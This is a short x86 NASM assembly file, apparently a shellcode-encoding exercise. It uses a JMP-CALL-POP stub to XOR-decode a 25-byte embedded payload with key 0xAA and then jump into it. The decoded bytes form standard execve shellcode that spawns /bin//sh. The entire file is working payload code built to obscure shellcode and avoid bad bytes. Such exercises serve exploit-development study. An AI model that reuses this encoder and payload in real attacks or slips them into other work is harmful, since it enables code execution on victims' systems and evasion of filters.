; XOR-Decoder.nasm
; Author: Kunal Varudkar

; Purpose: Developing xor Decoder


global _start

section .text

_start:

	jmp short call_decoder		;JMP-CALL-POP technique 


decoder:

	pop esi				; get the memory address of shellcode in esi 
	xor ecx, ecx			; xor op to avoid bad character
	mov cl, 25			; using ecx reg to use loop( length of shellcode=25)

decode:			
	; XOR-decoding
	xor byte [esi], 0xAA		; xor each byte with 0xAA
	inc esi				; Increment esi for next bytearray
	loop decode			; loop until ecx is zero
 			
	jmp short shellcode		; ecx=0 goto shellcode(indicate decoding is done)

call_decoder:
	
	call decoder
				; encoded shellcode
	shellcode:	db	0x9b,0x6a,0xfa,0xc2,0xc4,0x85,0xd9,0xc2,0xc2,0x85,0x85,0xc8,0xc3,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
